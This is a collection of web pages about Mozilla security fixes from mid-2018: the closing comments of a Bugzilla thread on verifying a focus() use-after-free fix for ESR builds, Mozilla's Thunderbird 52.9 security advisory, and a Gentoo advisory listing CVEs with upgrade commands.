For ESR 52.9.0, Build ID 20180619102821 and ESR 60.1.0 Build ID 20180619173714, the testcases attached is nor working: the two input boxes are not displayed, and the crash is not reproducible. Please note that I tried with Esr builds generated from <http://archive.mozilla.org/pub/firefox/candidates/> and also with ASAN fuzzy builds downloded from <https://tools.taskcluster.net/index/gecko.v2.mozilla-esr60.latest.firefox/linux64-fuzzing-asan-opt>.
Olli, am I missing something for the esr builds? Should this testcase work on esr builds?
[status-firefox61](/buglist.cgi?f1=cf_status_firefox61&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox61&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox61&o1=equals&v1=verified)
[status-firefox62](/buglist.cgi?f1=cf_status_firefox62&o1=isnotempty):
[fixed](/buglist.cgi?f1=cf_status_firefox62&o1=equals&v1=fixed) → [verified](/buglist.cgi?f1=cf_status_firefox62&o1=equals&v1=verified)Flags: needinfo?(bugs)

|  | [Olli Pettay [:smaug][bugs@pettay.fi]](/user_profile?user_id=39966)  Assignee |  |
| --- | --- | --- |
| [Comment 17](/show_bug.cgi?id=1459693#c17)• 7 years ago |
|  | |

I guess FuzzingFunctions isn't in esr?Flags: needinfo?(bugs)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 18](/show_bug.cgi?id=1459693#c18)• 7 years ago |
| obsolete | |

| Comment hidden (obsolete) |  |
| --- | --- |

sec-high seems more appropriate here. All the uses in CheckIfFocusable() are reads and not writes. If somehow you managed to thread through this function with an appropriate answer the deleted objection might be used later but it's currently not as straightforward a path to exploitability as we usually require for sec-critical.Keywords: [sec-critical](/buglist.cgi?keywords=sec-critical&resolution=---) → [sec-high](/buglist.cgi?keywords=sec-high&resolution=---)

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Comment 19](/show_bug.cgi?id=1459693#c19)• 7 years ago |
| obsolete | |

| Comment hidden (obsolete) |  |
| --- | --- |

Never mind me, plenty of virtual functions called.Keywords: [sec-high](/buglist.cgi?keywords=sec-high&resolution=---) → [sec-critical](/buglist.cgi?keywords=sec-critical&resolution=---)

|  | [Brindusa Tot, Desktop QA](/user_profile?user_id=553429) |  |
| --- | --- | --- |
| [Comment 20](/show_bug.cgi?id=1459693#c20)• 7 years ago |
|  | |

For ESR 60, I used an ASAN fuzzy build downloaded from <https://tools.taskcluster.net/index/gecko.v2.mozilla-esr60.latest.firefox/linux64-fuzzing-asan-opt> .
The testcase from [comment 0](/show_bug.cgi?id=1459693#c0 "RESOLVED FIXED - heap-use-after-free in nsFocusManager::CheckIfFocusable") is not working (the two input boxes are not displayed) and I am getting the following error in console:
JavaScript error: chrome://xbl-marquee/content/xbl-marquee.xml, line 541: TypeError: this.outerDiv is undefined
1529587265928 addons.update-checker WARN onUpdateCheckComplete failed to parse update manifest: [Exception... "Update manifest is missing a required addons property." nsresult: "0x80004005 (NS\_ERROR\_FAILURE)" location: "JS frame :: resource://gre/modules/addons/AddonUpdateChecker.jsm :: getRequiredProperty :: line 461" data: no] Stack trace: getRequiredProperty()@resource://gre/modules/addons/AddonUpdateChecker.jsm:461.
Also, I did not reproduce the crash.
The same behavior can be observed on official ESR 60.1.0 build ID 20180621121604.
As for ESR 52, I did not find an ASAN build with fuzzy functions, so I used an asan build and used the DOMFuzz Helper for fuzzy functions. The result is the same as for the ESR 60: the testcase is not working and the crash is not reproducible. The same on latest ESR 52.9.0 build ID 20180621064021.
I'm not sure what the verification criteria is for ESR builds:
1. Testcase does not crash on esr builds
2. Testcase doesn't seem to work on esr builds(the two input boxes are not displayed)
Summing up, I'm not sure how to continue verification on this.Flags: needinfo?(nils)Flags: needinfo?(bugs)

|  | [Olli Pettay [:smaug][bugs@pettay.fi]](/user_profile?user_id=39966)  Assignee |  |
| --- | --- | --- |
| [Comment 21](/show_bug.cgi?id=1459693#c21)• 7 years ago |
|  | |

I don't know how to explicitly verify this on those branches.
The patch itself is rather obvious, so if this is verified on non-ESR, that should be, IMO, enough.Flags: needinfo?(bugs)

|  | [Brindusa Tot, Desktop QA](/user_profile?user_id=553429) |  |
| --- | --- | --- |
| [Comment 22](/show_bug.cgi?id=1459693#c22)• 7 years ago |
|  | |

Based on the previous comment, this can be considered verified. Remove the qe-verify+ flag.Flags: qe-verify+

|  | [Al Billings [:abillings - ex-MoCo]](/user_profile?user_id=280903) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1459693#a10890698_280903)• 6 years ago |

Flags: sec-bounty?

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1459693#a11486977_1689)• 6 years ago |

Flags: sec-bounty? → sec-bounty+

|  | [Nobody; OK to take it and work on it](/user_profile?user_id=1) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1459693#a26767006_1)• 6 years ago |

Component: DOM → DOM: Core & HTML

|  | [Daniel Veditz [:dveditz]](/user_profile?user_id=1689) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1459693#a56186104_1689)• 5 years ago |

Group: core-security-release

|  | [David Lawrence [:dkl]](/user_profile?user_id=5898) |  |
| --- | --- | --- |
| [Updated](/show_bug.cgi?id=1459693#a191370036_5898)• 8 months ago |

Keywords: [reporter-external](/buglist.cgi?keywords=reporter-external&resolution=---)
You need to [log in](/show_bug.cgi?id=1459693&GoAheadAndLogIn=1)
before you can comment on or make changes to this bug.

Top ↑

## Attachment

Hide Details

### General

Creator:  [Nils](/user_profile?user_id=344130)

Created:
Updated:
Size:

### Description

### File Name

### Content Type

Raw
Diff
Splinter Review



=== Content from www.mozilla.org_1340c57d_20250125_084125.html ===


## Help us improve your Mozilla experience

In addition to Cookies necessary for this site to function, we’d like your permission to set some additional Cookies to better understand your browsing needs and improve your experience. Rest assured — we value your privacy.

Accept All Additional Cookies

Reject All Additional Cookies

[Cookie settings](/en-US/privacy/websites/cookie-settings/)

Menu
[![Mozilla](https://www.mozilla.org/media/img/logos/m24/lockup-black.f2ddba3f0724.svg)](/en-US/)

* [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
  Firefox browsers](/en-US/firefox/)
  Close Firefox browsers menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Desktop](/en-US/firefox/new/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for iOS](/en-US/firefox/browsers/mobile/ios/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/logo.eb1324e44442.svg)
    ## Firefox for Android](/en-US/firefox/browsers/mobile/android/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/browser/focus/logo.aac3e33175cb.svg)
    ## Firefox Focus](/en-US/firefox/browsers/mobile/focus/)
  + [## Firefox blog](https://blog.mozilla.org/firefox/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=firefox)
* [Products](/en-US/products/)
  Close Products menu
  + [![](https://www.mozilla.org/media/protocol/img/logos/mozilla/vpn/logo.c648f487bfb8.svg)
    ## Mozilla VPN](/en-US/products/vpn/)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/monitor/logo.d97e5516f9e6.svg)
    ## Mozilla Monitor](https://monitor.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/firefox/relay/logo-white.d42a8b52e44c.svg)
    ## Firefox Relay](https://relay.firefox.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/protocol/img/logos/pocket/logo.17446bc33a5d.svg)
    ## Pocket](https://getpocket.com/firefox_learnmore/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/nav/icons/icon-mdn-plus.f54475f980ab.svg)
    ## MDN Plus](https://developer.mozilla.org/plus?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/fakespot/logo-blue.3973b8fe9631.svg)
    ## Fakespot](https://fakespot.com/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=products)
  + [![](https://www.mozilla.org/media/img/logos/thunderbird/logo-thunderbird.121e9c0fed45.svg)
    ## Thunderbird](https://www.thunderbird.net/)

  [All products](/en-US/products/)
* [About us](/en-US/about/)
  Close About us menu

  Our Mission

  + [## About Mozilla](/en-US/about/)
  + [## The Mozilla Manifesto](/en-US/about/manifesto/)
  + [## Get Involved](/en-US/contribute/)
  + [## Innovation Projects](https://future.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Blog](https://blog.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)

  Our Work

  + [## Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla.ai](https://www.mozilla.ai/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Ventures](https://mozilla.vc/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=nav&utm_content=about-us)
  + [## Mozilla Advertising](/en-US/advertising/)

## Menu

* Mozilla Security

## [Mozilla Security](/en-US/security/)

* [Advisories](/en-US/security/advisories/)
* [Known Vulnerabilities](/en-US/security/known-vulnerabilities/)
* [Mozilla Security Blog](https://blog.mozilla.com/security/)
* [Security Bug Bounty](/en-US/security/bug-bounty/)
* [Third-party Injection Policy](/en-US/security/third-party-software-injection/)

## [Client Bug Bounty](/en-US/security/client-bug-bounty/)

* [Frequently Asked Questions](/en-US/security/bug-bounty/faq/)
* [Hall of Fame](/en-US/security/bug-bounty/hall-of-fame/)

## [Web Bug Bounty](/en-US/security/web-bug-bounty/)

* [Eligible Websites](/en-US/security/bug-bounty/web-eligible-sites/)
* [Frequently Asked Questions](/en-US/security/bug-bounty/faq-webapp/)
* [Hall of Fame](/en-US/security/bug-bounty/web-hall-of-fame/)

# Mozilla Foundation Security Advisory 2018-18

## Security vulnerabilities fixed in Thunderbird 52.9

Announced
July 3, 2018
Impact
critical
Products
Thunderbird
Fixed in

* Thunderbird 52.9

*In general, these flaws cannot be exploited through email in the Thunderbird product because scripting is disabled when reading mail, but are potentially risks in browser or browser-like contexts.*

#### [#CVE-2018-12359: Buffer overflow using computed size of canvas element](#CVE-2018-12359)

Reporter
Nils
Impact
critical
##### Description

A buffer overflow can occur when rendering canvas content while adjusting the height and width of the `<canvas>` element dynamically, causing data to be written outside of the currently computed boundaries. This results in a potentially exploitable crash.

##### References

* [Bug 1459162](https://bugzilla.mozilla.org/show_bug.cgi?id=1459162)

#### [#CVE-2018-12360: Use-after-free when using focus()](#CVE-2018-12360)

Reporter
Nils
Impact
critical
##### Description

A use-after-free vulnerability can occur when deleting an `input` element during a mutation event handler triggered by focusing that element. This results in a potentially exploitable crash.

##### References

* [Bug 1459693](https://bugzilla.mozilla.org/show_bug.cgi?id=1459693)

#### [#CVE-2018-12372: S/MIME and PGP decryption oracles can be built with HTML emails](#CVE-2018-12372)

Reporter
Damian Poddebniak, Christian Dresen, Jens Müller, Fabian Ising, Sebastian Schinzel, Simon Friedberger, Juraj Somorovsky, Jörg Schwenk
Impact
high
##### Description

Decrypted S/MIME parts, when included in HTML crafted for an attack, can leak plaintext when included in a a HTML reply/forward.

##### References

* [Bug 1419417](https://bugzilla.mozilla.org/show_bug.cgi?id=1419417)

#### [#CVE-2018-12373: S/MIME plaintext can be leaked through HTML reply/forward](#CVE-2018-12373)

Reporter
Damian Poddebniak, Christian Dresen, Jens Müller, Fabian Ising, Sebastian Schinzel, Simon Friedberger, Juraj Somorovsky, Jörg Schwenk
Impact
high
##### Description

dDecrypted S/MIME parts hidden with CSS or `<plaintext>` can leak plaintext when included in a HTML reply/forward.

##### References

* [CVE-2018-12373](https://bugzilla.mozilla.org/show_bug.cgi?id=1464056)
* [Suppress <plaintext> in email messages](https://bugzilla.mozilla.org/show_bug.cgi?id=1464667)

#### [#CVE-2018-12362: Integer overflow in SSSE3 scaler](#CVE-2018-12362)

Reporter
F. Alonso (revskills)
Impact
high
##### Description

An integer overflow can occur during graphics operations done by the Supplemental Streaming SIMD Extensions 3 (SSSE3) scaler, resulting in a potentially exploitable crash.

##### References

* [Bug 1452375](https://bugzilla.mozilla.org/show_bug.cgi?id=1452375)

#### [#CVE-2018-12363: Use-after-free when appending DOM nodes](#CVE-2018-12363)

Reporter
Nils
Impact
high
##### Description

A use-after-free vulnerability can occur when script uses mutation events to move DOM nodes between documents, resulting in the old document that held the node being freed but the node still having a pointer referencing it. This results in a potentially exploitable crash.

##### References

* [Bug 1464784](https://bugzilla.mozilla.org/show_bug.cgi?id=1464784)

#### [#CVE-2018-12364: CSRF attacks through 307 redirects and NPAPI plugins](#CVE-2018-12364)

Reporter
David Black
Impact
high
##### Description

NPAPI plugins, such as Adobe Flash, can send non-simple cross-origin requests, bypassing CORS by making a same-origin POST that does a 307 redirect to the target site. This allows for a malicious site to engage in cross-site request forgery (CSRF) attacks.

##### References

* [Bug 1436241](https://bugzilla.mozilla.org/show_bug.cgi?id=1436241)

#### [#CVE-2018-12365: Compromised IPC child process can list local filenames](#CVE-2018-12365)

Reporter
Alex Gaynor
Impact
moderate
##### Description

A compromised IPC child process can escape the content sandbox and list the names of arbitrary files on the file system without user consent or interaction. This could result in exposure of private local files.

##### References

* [Bug 1459206](https://bugzilla.mozilla.org/show_bug.cgi?id=1459206)

#### [#CVE-2018-12366: Invalid data handling during QCMS transformations](#CVE-2018-12366)

Reporter
OSS-Fuzz
Impact
moderate
##### Description

An invalid grid size during QCMS (color profile) transformations can result in the out-of-bounds read interpreted as a float value. This could leak private data into the output.

##### References

* [Bug 1464039](https://bugzilla.mozilla.org/show_bug.cgi?id=1464039)

#### [#CVE-2018-12368: No warning when opening executable SettingContent-ms files](#CVE-2018-12368)

Reporter
Abdulrahman Alqabandi
Impact
moderate
##### Description

Windows 10 does not warn users before opening executable files with the `SettingContent-ms` extension even when they have been downloaded from the internet and have the "Mark of the Web." Without the warning, unsuspecting users unfamiliar with this new file type might run an unwanted executable. This also allows a WebExtension with the limited `downloads.open` permission to execute arbitrary code without user interaction on Windows 10 systems
*Note: this issue only affects Windows operating systems. Other operating systems are unaffected.*

##### References

* [Bug 1468217](https://bugzilla.mozilla.org/show_bug.cgi?id=1468217)
* [The Tale of SettingContent-ms Files](https://posts.specterops.io/the-tale-of-settingcontent-ms-files-f1ea253e4d39)

#### [#CVE-2018-12374: Using form to exfiltrate encrypted mail part by pressing enter in form field](#CVE-2018-12374)

Reporter
Hanno Boeck
Impact
low
##### Description

Plaintext of decrypted emails can leak through by user submitting an embedded form by pressing enter key within a text input field.

##### References

* [Bug 1462910](https://bugzilla.mozilla.org/show_bug.cgi?id=1462910)

#### [#CVE-2018-5188: Memory safety bugs fixed in Firefox 61, Firefox ESR 60.1, Firefox ESR 52.9, and Thunderbird 52.9](#CVE-2018-5188)

Reporter
Mozilla developers and community
Impact
critical
##### Description

Mozilla developers and community members Alex Gaynor, Christoph Diehl, Christian Holler, Jason Kratzer, David Major, Jon Coppeard, Nicolas B. Pierron, Jason Kratzer, Marcia Knous, and Ronald Crane reported memory safety bugs present in Firefox 60, Firefox ESR 60, Firefox ESR 52.8, and Thunderbird 52.8. Some of these bugs showed evidence of memory corruption and we presume that with enough effort that some of these could be exploited to run arbitrary code.

##### References

* [Memory safety bugs fixed in Firefox 61, Firefox ESR 60.1, Firefox ESR 52.9, and Thunderbird 52.9](https://bugzilla.mozilla.org/buglist.cgi?bug_id=1456189%2C1456975%2C1465898%2C1392739%2C1451297%2C1464063%2C1437842%2C1442722%2C1452576%2C1450688%2C1458264%2C1458270%2C1465108%2C1464829%2C1464079%2C1463494%2C1458048)

## Company

* [Leadership](/about/leadership/)
* [Press Center](https://blog.mozilla.org/category/mozilla/news/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=company)
* [Careers](/en-US/careers/)
* [Contact](/en-US/contact/)

## Support

* [Product Help](https://support.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [File a Bug](https://bugzilla.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)
* [Localize Mozilla](https://pontoon.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=support)

## Resources

* [Advertise with Mozilla](/en-US/advertising/)
* [Firefox Release Notes](/firefox/134.0.2/releasenotes/)

## Developers

* [Developer Edition](/en-US/firefox/developer/)
* [Enterprise](/en-US/firefox/enterprise/)
* [Tools](https://firefox-source-docs.mozilla.org/devtools-user/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer&utm_content=developers)
* [MDN](https://developer.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer)

## Follow @Mozilla

* [X (formerly Twitter) (@mozilla)](https://twitter.com/mozilla)
* [Instagram (@mozilla)](https://www.instagram.com/mozilla/)
* [LinkedIn (@mozilla)](https://www.linkedin.com/company/mozilla-corporation/)
* [TikTok (@mozilla)](https://www.tiktok.com/%40mozilla)
* [Spotify (@mozilla)](https://open.spotify.com/show/0vT7LJMeVDxyQ2ZamHKu08?si=_uDRD6bRR_6M5YZyISGXgA)

## Follow @Firefox

* [X (formerly Twitter) (@firefox)](https://twitter.com/firefox)
* [Instagram (@firefox)](https://www.instagram.com/firefox/)
* [YouTube (@firefoxchannel)](https://www.youtube.com/user/firefoxchannel)
* [TikTok (@firefox)](https://www.tiktok.com/%40firefox)

[Donate](https://foundation.mozilla.org/?form=moco-donate-footer)

Visit [Mozilla Corporation’s](/en-US/) not-for-profit parent, the [Mozilla Foundation](https://foundation.mozilla.org/?utm_source=www.mozilla.org&utm_medium=referral&utm_campaign=footer).

Portions of this content are ©1998–2025 by individual mozilla.org contributors. Content available under a [Creative Commons license](/en-US/foundation/licensing/website-content/).

* [Website Privacy Notice](/en-US/privacy/websites/)
* [Cookies](/en-US/privacy/websites/cookie-settings/)
* [Legal](/en-US/about/legal/)
* [Community Participation Guidelines](/en-US/about/governance/policies/participation/)
* [About this site](/en-US/about/this-site/)

![](https://www.mozilla.org/media/img/logos/m24/wordmark-white.2d673bb5b33a.svg)



=== Content from security.gentoo.org_7616c626_20250125_084123.html ===

[![Gentoo](https://assets.gentoo.org/tyrian/v2/site-logo.png)](/ "Back to the homepage")
Security

[**Get Gentoo!**](https://get.gentoo.org/)
gentoo.org sites
[gentoo.org](https://www.gentoo.org/ "Main Gentoo website")
[Wiki](https://wiki.gentoo.org/ "Find and contribute documentation")
[Bugs](https://bugs.gentoo.org/ "Report issues and find common issues")
[Forums](https://forums.gentoo.org/ "Discuss with the community")
[Packages](https://packages.gentoo.org/ "Find software for your Gentoo")

[Planet](https://planet.gentoo.org/ "Find out what's going on in the developer community")
[Archives](https://archives.gentoo.org/ "Read up on past discussions")
[Sources](https://sources.gentoo.org/ "Browse our source code")

[Infra Status](https://infra-status.gentoo.org/ "Get updates on the services provided by Gentoo")

* [Home](/)
* [Stay informed](/subscribe)
* [Advisories](/glsa)

# Mozilla Thunderbird: Multiple vulnerabilities — GLSA **201811-13**

Multiple vulnerabilities have been found in Mozilla Thunderbird,
the worst of which could lead to the execution of arbitrary code.

### Affected packages

| Package | **mail-client/thunderbird** on all architectures |
| --- | --- |
| Affected versions | < **60.3.0** |
| Unaffected versions | >= **60.3.0** |

| Package | **mail-client/thunderbird-bin** on all architectures |
| --- | --- |
| Affected versions | < **60.3.0** |
| Unaffected versions | >= **60.3.0** |

### Background

Mozilla Thunderbird is a popular open-source email client from the
Mozilla project.

### Description

Multiple vulnerabilities have been discovered in Mozilla Thunderbird.
Please review the referenced Mozilla Foundation Security Advisories and
CVE identifiers below for details.

### Impact

A remote attacker may be able to execute arbitrary code, cause a Denial
of Service condition, obtain sensitive information, or conduct Cross-Site
Request Forgery (CSRF).

### Workaround

There is no known workaround at this time.

### Resolution

All Thunderbird users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose ">=mail-client/thunderbird-60.3.0"

```

All Thunderbird binary users should upgrade to the latest version:

```
 # emerge --sync
 # emerge --ask --oneshot --verbose
 ">=mail-client/thunderbird-bin-60.3.0"

```
### References

* [CVE-2017-16541](https://nvd.nist.gov/vuln/detail/CVE-2017-16541)
* [CVE-2018-12359](https://nvd.nist.gov/vuln/detail/CVE-2018-12359)
* [CVE-2018-12360](https://nvd.nist.gov/vuln/detail/CVE-2018-12360)
* [CVE-2018-12361](https://nvd.nist.gov/vuln/detail/CVE-2018-12361)
* [CVE-2018-12362](https://nvd.nist.gov/vuln/detail/CVE-2018-12362)
* [CVE-2018-12363](https://nvd.nist.gov/vuln/detail/CVE-2018-12363)
* [CVE-2018-12364](https://nvd.nist.gov/vuln/detail/CVE-2018-12364)
* [CVE-2018-12365](https://nvd.nist.gov/vuln/detail/CVE-2018-12365)
* [CVE-2018-12366](https://nvd.nist.gov/vuln/detail/CVE-2018-12366)
* [CVE-2018-12367](https://nvd.nist.gov/vuln/detail/CVE-2018-12367)
* [CVE-2018-12371](https://nvd.nist.gov/vuln/detail/CVE-2018-12371)
* [CVE-2018-12372](https://nvd.nist.gov/vuln/detail/CVE-2018-12372)
* [CVE-2018-12373](https://nvd.nist.gov/vuln/detail/CVE-2018-12373)
* [CVE-2018-12374](https://nvd.nist.gov/vuln/detail/CVE-2018-12374)
* [CVE-2018-12376](https://nvd.nist.gov/vuln/detail/CVE-2018-12376)
* [CVE-2018-12377](https://nvd.nist.gov/vuln/detail/CVE-2018-12377)
* [CVE-2018-12378](https://nvd.nist.gov/vuln/detail/CVE-2018-12378)
* [CVE-2018-12379](https://nvd.nist.gov/vuln/detail/CVE-2018-12379)
* [CVE-2018-12383](https://nvd.nist.gov/vuln/detail/CVE-2018-12383)
* [CVE-2018-12385](https://nvd.nist.gov/vuln/detail/CVE-2018-12385)
* [CVE-2018-12389](https://nvd.nist.gov/vuln/detail/CVE-2018-12389)
* [CVE-2018-12390](https://nvd.nist.gov/vuln/detail/CVE-2018-12390)
* [CVE-2018-12391](https://nvd.nist.gov/vuln/detail/CVE-2018-12391)
* [CVE-2018-12392](https://nvd.nist.gov/vuln/detail/CVE-2018-12392)
* [CVE-2018-12393](https://nvd.nist.gov/vuln/detail/CVE-2018-12393)
* [CVE-2018-5125](https://nvd.nist.gov/vuln/detail/CVE-2018-5125)
* [CVE-2018-5127](https://nvd.nist.gov/vuln/detail/CVE-2018-5127)
* [CVE-2018-5129](https://nvd.nist.gov/vuln/detail/CVE-2018-5129)
* [CVE-2018-5144](https://nvd.nist.gov/vuln/detail/CVE-2018-5144)
* [CVE-2018-5145](https://nvd.nist.gov/vuln/detail/CVE-2018-5145)
* [CVE-2018-5146](https://nvd.nist.gov/vuln/detail/CVE-2018-5146)
* [CVE-2018-5150](https://nvd.nist.gov/vuln/detail/CVE-2018-5150)
* [CVE-2018-5154](https://nvd.nist.gov/vuln/detail/CVE-2018-5154)
* [CVE-2018-5155](https://nvd.nist.gov/vuln/detail/CVE-2018-5155)
* [CVE-2018-5156](https://nvd.nist.gov/vuln/detail/CVE-2018-5156)
* [CVE-2018-5159](https://nvd.nist.gov/vuln/detail/CVE-2018-5159)
* [CVE-2018-5161](https://nvd.nist.gov/vuln/detail/CVE-2018-5161)
* [CVE-2018-5162](https://nvd.nist.gov/vuln/detail/CVE-2018-5162)
* [CVE-2018-5168](https://nvd.nist.gov/vuln/detail/CVE-2018-5168)
* [CVE-2018-5170](https://nvd.nist.gov/vuln/detail/CVE-2018-5170)
* [CVE-2018-5178](https://nvd.nist.gov/vuln/detail/CVE-2018-5178)
* [CVE-2018-5183](https://nvd.nist.gov/vuln/detail/CVE-2018-5183)
* [CVE-2018-5184](https://nvd.nist.gov/vuln/detail/CVE-2018-5184)
* [CVE-2018-5185](https://nvd.nist.gov/vuln/detail/CVE-2018-5185)
* [CVE-2018-5187](https://nvd.nist.gov/vuln/detail/CVE-2018-5187)
* [CVE-2018-5188](https://nvd.nist.gov/vuln/detail/CVE-2018-5188)

**Release date**

November 24, 2018

**Latest revision**

November 24, 2018: 1

**Severity**

normal

**Exploitable**

remote

**Bugzilla entries**

* [651862](https://bugs.gentoo.org/show_bug.cgi?id=651862)
* [656092](https://bugs.gentoo.org/show_bug.cgi?id=656092)
* [660342](https://bugs.gentoo.org/show_bug.cgi?id=660342)
* [669960](https://bugs.gentoo.org/show_bug.cgi?id=669960)
* [670102](https://bugs.gentoo.org/show_bug.cgi?id=670102)

### Questions or comments?

Please feel free to contact us.

**© 2001–2020 Gentoo Foundation, Inc.**



=== Content from www.redhat.com_827cb00d_20250126_073635.html ===


[Skip to navigation](#pfe-navigation)
[Skip to main content](#cp-main)
### Utilities

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)

[![Red Hat Customer Portal](https://access.redhat.com/chrome_themes/nimbus/img/red-hat-customer-portal.svg)](https://access.redhat.com/)

* [Subscriptions](https://access.redhat.com/management/)
* [Downloads](https://access.redhat.com/downloads/)
* [Red Hat Console](//console.redhat.com/)
* [Get Support](https://access.redhat.com/support/)
* [Products](https://access.redhat.com/)
  ### Top Products

  + [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
  + [Red Hat OpenShift](https://access.redhat.com/products/red-hat-openshift-container-platform)
  + [Red Hat Ansible Automation Platform](https://access.redhat.com/products/red-hat-ansible-automation-platform/)
  [All Products](https://access.redhat.com/products/)

  ### Downloads and Containers

  + [Downloads](https://access.redhat.com/downloads/)
  + [Packages](https://access.redhat.com/downloads/content/package-browser)
  + [Containers](https://catalog.redhat.com/software/containers/explore/)
  ### Top Resources

  + [Documentation](//docs.redhat.com/)
  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Product Compliance](https://access.redhat.com/articles/1202803)
  + [Errata](https://access.redhat.com/errata/)
* [Knowledge](https://access.redhat.com/labs/)
  ### Red Hat Knowledge Center

  + [Knowledgebase Solutions](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Solution)
  + [Knowledgebase Articles](https://access.redhat.com/search/?q=*&p=1&rows=10&documentKind=Article)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Errata](https://access.redhat.com/errata/)
  ### Top Product Docs

  + [Red Hat Enterprise Linux](//docs.redhat.com/en/documentation/red_hat_enterprise_linux/)
  + [Red Hat OpenShift](//docs.redhat.com/en/documentation/openshift_container_platform/)
  + [Red Hat Ansible Automation Platform](//docs.redhat.com/en/documentation/red_hat_ansible_automation_platform/)
  [All Product Docs](//docs.redhat.com/en/products)

  ### [Training and Certification](//www.redhat.com/en/services/training-and-certification)

  + [About](//www.redhat.com/en/services/training-and-certification)
  + [Course Index](//www.redhat.com/en/services/training/all-courses-exams)
  + [Certification Index](//www.redhat.com/en/services/certifications)
  + [Skill Assessment](//skills.ole.redhat.com/)
* [Security](https://access.redhat.com/security/)
  ### [Red Hat Product Security Center](https://access.redhat.com/security)

  + [Security Updates](https://access.redhat.com/security)
  + [Security Advisories](https://access.redhat.com/security/security-updates/#/security-advisories)
  + [Red Hat CVE Database](https://access.redhat.com/security/security-updates/#/cve)
  + [Errata](https://access.redhat.com/errata/)
  ### References

  + [Security Bulletins](https://access.redhat.com/security/vulnerabilities)
  + [Security Measurement](https://www.redhat.com/security/data/metrics/)
  + [Severity Ratings](https://access.redhat.com/security/updates/classification/)
  + [Security Data](https://access.redhat.com/security/data)
  ### Top Resources

  + [Security Labs](https://access.redhat.com/security/security-updates/#/security-labs)
  + [Backporting Policies](https://access.redhat.com/security/updates/backporting/)
  + [Security Blog](//redhat.com/en/blog/channel/security)
* [Support](https://access.redhat.com/support/)
  ### [Red Hat Support](https://access.redhat.com/support/)

  + [Support Cases](https://access.redhat.com/support/cases/)
  + [Troubleshoot](https://access.redhat.com/support/cases/#/troubleshoot)
  + [Get Support](https://access.redhat.com/support/)
  + [Contact Red Hat Support](https://access.redhat.com/support/contact/)
  ### [Red Hat Community Support](https://access.redhat.com/community)

  + [Customer Portal Community](https://access.redhat.com/community/)
  + [Community Discussions](https://access.redhat.com/discussions/)
  + [Red Hat Accelerator Program](https://access.redhat.com/accelerators/)
  ### Top Resources

  + [Product Life Cycles](https://access.redhat.com/product-life-cycles/)
  + [Customer Portal Labs](https://access.redhat.com/labs/)
  + [Red Hat JBoss Supported Configurations](https://access.redhat.com/support/configurations/jboss)
  + [Red Hat Insights](https://cloud.redhat.com/insights)

Or [troubleshoot an issue](/support/cases/#/troubleshoot).

English

## Select Your Language

* [English](https://access.redhat.com/changeLanguage?language=en)
* [Français](https://access.redhat.com/changeLanguage?language=fr)
* [한국어](https://access.redhat.com/changeLanguage?language=ko)
* [日本語](https://access.redhat.com/changeLanguage?language=ja)
* [中文 (中国)](https://access.redhat.com/changeLanguage?language=zh_CN)

### Infrastructure and Management

* [Red Hat Enterprise Linux](https://access.redhat.com/products/red-hat-enterprise-linux/)
* [Red Hat Satellite](https://access.redhat.com/products/red-hat-satellite/)
* [Red Hat Subscription Management](https://access.redhat.com/products/red-hat-subscription-management/)
* [Red Hat Insights](https://access.redhat.com/products/red-hat-insights/)
